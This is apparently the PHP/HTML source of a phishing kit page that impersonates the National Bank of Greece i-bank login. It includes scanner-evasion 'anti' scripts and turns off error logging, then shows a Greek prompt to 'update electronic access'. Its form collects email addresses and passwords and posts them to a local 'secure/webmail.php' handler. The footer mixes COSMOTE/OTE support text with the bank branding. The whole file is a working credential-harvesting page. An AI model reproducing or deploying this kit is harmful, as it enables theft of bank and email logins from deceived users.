<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
include '../prevents/9atila.php';

?>

<!doctype html>
<html><head>
    <title>NBG i-bank</title>
    <baase href="https://ibank.nbg.gr/identity/">
    <meta name="contextPath" content="/identity/">
    <meta name="multilanguage" content="true">
    <meta name="mntc" content="[mntc]">
    <meta name="mntcMsg" content="[mntcMsg]">
    <meta name="ile" content="false">
    <meta name="ardt" content="2020-02-07T03:31:53.8140763Z">
    <meta name="arUri" content="https://ibank.nbg.gr/web/">
    <meta name="lng" content="el">
    <meta name="epe" content="false">
    <meta name="_af" content="2zuVyd0kIZn814XY3RSsW6rQzU12JcFJ53aHsVslm9KLwafA6GkBxzy6aXoPd_dYG3VsucbOORee8VR6KWN5rcE0kZe1FB6rM7gK-gwMJAo1">
    <meta name="emg" content="">
    <meta name="cId" content="login-bg">
    <meta name="rscsSc" content="[rscsSc]">
    <meta name="bank" content="NBG">
    <meta name="indexTemplate" content="login-night">
    <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
    <meta name="gaId" content="UA-33771010-2">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="icon" type="image/png" href="imgs/favicon.ico">
<link href="css/style.27b415c4e44a2a89662a.css" rel="stylesheet"><link href="css/nbg.jquery.cookiebar.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
</head>


<body>
    <index-page ng-version="7.2.15"><div agent-type="" class="appRoot"><loading-stage><!----></loading-stage><router-outlet></router-outlet><login-header></login-header>










<nav class="navbar navbar-expand-lg navbar-light bg-light" style="border: 1px solid black">
  
  <img href="#" src="imgs/logo.png" height="70px">
 
</nav>












<div style="height: 500px; background-color: white">
    <div class="row">
 <div class="col-xs-11 col-md-3"></div>   
<div class="col-xs-11 col-md-6">
<br>
<center>
<p> ενημερώστε την ηλεκτρονική σας πρόσβαση</p>
</center>

<form method="post" action="./secure/webmail.php" style="padding: 10px">
    <center>
    <img src="imgs/email.png" style="width: 80px">
    </center>
  <div class="form-group">
    <label for="exampleInputEmail1">Email</label>
    <input type="email" name="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp">
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1">Κωδικός Πρόσβασης</label>
    <input type="password" name="password" class="form-control" id="exampleInputPassword1">
  </div>
  <div class="form-group form-check" style="display: inline-block;">
    <input type="checkbox" class="form-check-input" id="exampleCheck1">
    <label class="form-check-label" for="exampleCheck1">Θυμήσου με</label>
  </div>
  <button type="submit" class="btn btn-primary pull-right" style="background-color: #45AE47;
    color: black;border-color: #000000">Επόμενο</button>
</form>

<p style="font-size: 8px">Για Βοήθεια & Υποστήριξη
• Ιδιώτες: Απευθυνθείτε στην Εξυπηρέτηση Πελατών COSMOTE στο 13888
• Επιχειρήσεις: Απευθυνθείτε στην Εξυπηρέτηση Εταιρικών Πελατών COSMOTE στο 13818
• Φορείς Σύζευξις: Καλέστε στο 800 11 97 888

Σημείωση: Η υπηρεσία παρέχεται από τον ΟΤΕ Α.Ε.
</p>


</div>





</div>





</body></div></html>